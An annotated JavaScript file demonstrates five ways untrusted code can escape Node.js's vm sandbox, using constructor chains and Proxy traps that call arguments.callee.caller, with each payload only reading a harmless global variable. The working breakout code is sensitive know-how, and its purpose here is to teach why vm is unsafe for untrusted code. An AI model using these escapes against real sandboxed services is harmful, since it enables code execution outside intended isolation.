////////
// The vm module lets you run a string containing javascript code 'in
// a sandbox', where you specify a context of global variables that
// exist for the duration of its execution. This works more or less
// well, and if you're in control of the code that's running, and you
// have a reasonable protocol in mind// for how it expects a certain
// context to exist and interacts with it --- like, maybe a plug-in
// API for a program, with some endpoints defined for it that do
// useful domain-specific things --- your life can go smoothly.

// However, the documentation [https://nodejs.org/api/vm.html] says
// very pointedly:
//     Note: The vm module is not a security mechanism. Do not use it
//     to run untrusted code.
// because untrusted code as a number of avenues for maliciously
// escaping the sandbox. Here's a few of them that I like,
// derived in part from things I learned reading
// [https://github.com/patriksimek/vm2/issues/32]
vm = require('vm');

////////
// A global variable the sandbox isn't supposed to see:

sauce = "laser"; // 'laser is the sauce'
					  // [https://www.theregister.co.uk/2018/02/08/waymo_uber_trial/]

////////
// If you directly access the variable from inside the sandbox, you don't
// get to see it.
const code1 = `"this is the sauce " + sauce`;
try {
  console.log(vm.runInContext(code1, vm.createContext({})));
}
catch(e) {
  console.log("I expected this to go wrong:", e);
  // We see: "ReferenceError: sauce is not defined"
}

////////
// But here's a funny thing. That empty object we passed as the constructor?
// Like every other object, it has a constructor.
console.log(({}).constructor); // -> [Function: Object]

// And that constructor has a constructor, which is the constructor of
// Functions.
console.log(({}).constructor.constructor); // -> [Function: Function]

// Did you know that if you call the Function constructor with a
// string argument, it basically does an eval and makes a function
// whose body is that string?
console.log(new Function("return (1+2)")()); // -> 3
console.log(({}).constructor.constructor("return (1+2)")()); // -> 3
console.log(({}).constructor.constructor("return sauce")()); // -> laser

// And the initial value of 'this' when we run in a vm is the global
// context object.
console.log(vm.runInContext(`this.a`, vm.createContext({a: 17}))); // -> 17

// Here's the critical thing: even if we take the 'empty' object, its
// constructor's constructor is still the geniune real Function that lives
// *outside* the vm, and constructs functions that run outside the vm.
// So if we do the following:

const code2 = `(this.constructor.constructor("return sauce"))()`;
console.log(vm.runInContext(code2, vm.createContext({}))); // -> laser

// ...we leak data from the global context into the vm.

////////
// This particular vector can be patched up by passing in a more restricted object
// as a context:
try {
  console.log(vm.runInContext(code2, vm.createContext(Object.create(null))));
}
catch(e) {
  console.log("I expected this to go wrong:", e);
  // We see: "ReferenceError: sauce is not defined"
}

// But this means we can't easily pass *any* data into the vm without
// worrying that some data somewhere has a reference to the global
// Object or Function or almost anything that has a chain of
// .constructor or .__proto or anything else that eventually yields
// the real outer Function constructor.

////////
// Suppose we're ok with that limitation with respect to the vm
// context object. It's *still* dangerous to interact with any data
// that the untrusted vm code returns, because it might get hold of
// indirect references to Function via proxies:

const code3 = `new Proxy({}, {
  set: function(me, key, value) { (value.constructor.constructor('console.log(sauce)'))() }
})`;

data = vm.runInContext(code3, vm.createContext(Object.create(null)));
// This line executes the setter proxy function, and
// prints out 'laser' despite no console.log immediately present.
data['some_key'] = {};

////////
// Even *reading* fields from returned data can be exploited, since
// the call stack when the proxy function is executed contains frames
// with references back to the real function:

const code4 = `new Proxy({}, {
  get: function(me, key) { (arguments.callee.caller.constructor('console.log(sauce)'))() }
})`;

data = vm.runInContext(code4, vm.createContext(Object.create(null)));
// The following executes the getter proxy function, and
// prints out 'laser' despite no console.log immediately present.
if (data['some_key']) {

}

////////
// Also, the vm code could throw an exception, with proxies on it.

const code5 = `throw new Proxy({}, {
  get: function(me, key) {
	 const cc = arguments.callee.caller;
	 if (cc != null) {
		(cc.constructor.constructor('console.log(sauce)'))();
	 }
	 return me[key];
  }
})`;


try {
  vm.runInContext(code5, vm.createContext(Object.create(null)));
}
catch(e) {
  // The following prints out 'laser' twice, (as side-effects of e
  // being converted to a string) followed by {}, which is the effect
  // of the console.log actually *on* this line printing out the
  // stringified value of the exception, which is in this case a
  // (proxy-wrapped) empty object.
  console.log(e);
}
